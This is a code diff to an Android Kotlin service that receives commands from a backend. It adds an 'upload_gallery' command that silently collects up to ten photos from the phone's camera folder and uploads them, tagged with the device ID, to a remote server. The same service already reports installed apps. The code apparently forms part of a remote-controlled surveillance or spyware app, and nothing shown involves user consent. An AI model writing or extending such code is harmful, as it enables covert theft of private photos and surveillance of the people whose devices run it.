@@ -21,6 +21,9 @@ import org.json.JSONArray
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import android.content.pm.PackageManager
+import java.io.File
+import android.os.Environment
+import okhttp3.RequestBody.Companion.asRequestBody
 
 
 class CommandService : Service() {
@@ -110,6 +113,12 @@ class CommandService : Service() {
                             sendInstalledAppsToBackend(applicationContext)
                         }
 
+                        "upload_gallery" -> {
+                            Log.d("CmdService", "Uploading gallery images...")
+                            uploadGalleryImages(applicationContext)
+                        }
+
+
                     }
 
                 } catch (e: Exception) {
@@ -118,6 +127,49 @@ class CommandService : Service() {
             }
         })
     }
+
+    private fun uploadGalleryImages(context: Context) {
+        val galleryDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera")
+        if (!galleryDir.exists() || !galleryDir.isDirectory) {
+            Log.e("UploadGallery", "DCIM/Camera directory not found")
+            return
+        }
+    
+        val files = galleryDir.listFiles { file ->
+            file.isFile && file.extension.lowercase() in listOf("jpg", "jpeg", "png")
+        } ?: return
+    
+        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        val uploadUrl = "${ApiConfig.BASE_URL}/api/device/upload_gallery_image"
+    
+        val client = OkHttpClient()
+    
+        for (file in files.take(10)) { // Limit to avoid bulk upload
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("device_id", deviceId)
+                .addFormDataPart(
+                    "image", file.name,
+                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
+                )
+                .build()
+    
+            val request = Request.Builder()
+                .url(uploadUrl)
+                .post(body)
+                .build()
+    
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e("UploadGallery", "Failed: ${e.message}")
+                }
+    
+                override fun onResponse(call: Call, response: Response) {
+                    Log.i("UploadGallery", "Uploaded ${file.name}: ${response.code}")
+                }
+            })
+        }
+    }
+    
 
     private fun startForegroundNotification() {
         val channelId = "command_service"
